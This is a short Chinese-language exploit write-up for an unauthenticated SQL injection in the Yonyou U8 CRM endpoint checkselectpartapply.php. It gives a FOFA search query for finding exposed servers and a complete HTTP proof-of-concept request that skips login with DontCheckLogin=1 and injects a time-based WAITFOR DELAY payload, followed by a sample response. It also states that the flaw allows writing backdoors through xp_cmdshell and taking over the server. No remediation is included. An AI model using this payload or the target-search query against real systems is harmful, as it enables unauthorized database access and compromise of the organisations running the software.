## 用友U8-CRM-checkselectpartapply.php-sql注入

## 一、漏洞简介
用友U8 CRM checkselectpartapply.php 接口存在SQL注入漏洞，未经身份验证的攻击者通过漏洞执行任意SQL语句，调用xpcmdshell写入后门文件，执行任意代码，从而获取到服务器权限。

## fofa
```
app="用友U8CRM"
```

## POC
```
POST /partrtn/checkselectpartapply.php?DontCheckLogin=1 HTTP/1.1
Host: ?
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=bgssesstimeout;
Content-Type: application/x-www-form-urlencoded; charset=utf-8
Connection: close

applyIDs=1);WAITFOR+DELAY+'0:0:5'--
```

## POC
```
HTTP/1.1 200 OK
Date: Thu, 15 Jan 2026 02:57:51 GMT
Server: Apache/2.4.41 (Win32) PHP/5.4.38
X-Powered-By: PHP/5.4.38
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Pragma: no-cache
Connection: close
Content-Type: text/html; charset=utf-8
Content-Length: auto

{
  "success": false,
  "message": "\u53ea\u80fd\u52ff\u9009\u540c\u4e00\u670d\u52a1\u5355\u4e0b\u7684\u914d\u4ef6\u7533\u8bf7\u660e\u7ec6"
}
```
